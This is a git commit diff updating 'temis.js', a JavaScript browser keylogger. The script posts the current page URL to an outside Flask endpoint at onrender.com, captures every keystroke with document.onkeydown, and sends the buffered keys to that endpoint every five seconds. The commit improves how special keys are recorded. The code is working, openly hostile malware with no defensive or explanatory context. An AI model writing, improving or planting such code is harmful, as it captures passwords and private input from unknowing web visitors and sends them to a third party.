0a6d373e597007d779f876264c4e688a305bdaf8
kalki303 <kalkivideos4u@gmail.com>
2025-04-25 16:49:45 +0530

    Update temis.js

--- temis.js
+++ temis.js
@@ -1,30 +1,30 @@
 var keys = '';
 var current = document.URL;
 
+// Send the current URL once
 var xhr = new XMLHttpRequest();
 xhr.open("POST", "https://flask-backend-mm3t.onrender.com/keylog", true);
 xhr.setRequestHeader('Content-Type', 'application/json');
-const json = {
-    "logged": current,
-};
-xhr.send(JSON.stringify(json));
+xhr.send(JSON.stringify({ "logged": current }));
 
 document.onkeydown = function (e) {
-    var get = window.event ? event : e;
-    var key = get.keyCode ? get.keyCode : get.charCode;
-    key = String.fromCharCode(key);
+    var key = e.key; // e.g., "a", "A", "Shift", "Enter", "@"
+    
+    // Optional: format keys for readability
+    if (key === " ") key = "[SPACE]";
+    else if (key === "Enter") key = "[ENTER]";
+    else if (key === "Backspace") key = "[BACKSPACE]";
+    else if (key.length > 1) key = `[${key}]`; // for Shift, Tab, etc.
+
     keys += key;
 }
 
 window.setInterval(function () {
-    if (keys != "") {
+    if (keys !== "") {
         var xhr_key = new XMLHttpRequest();
         xhr_key.open("POST", "https://flask-backend-mm3t.onrender.com/keylog", true);
         xhr_key.setRequestHeader('Content-Type', 'application/json');
-        const json_key = {
-            "logged": keys,
-        };
-        xhr_key.send(JSON.stringify(json_key));
+        xhr_key.send(JSON.stringify({ "logged": keys }));
         keys = "";
     }
 }, 5000);
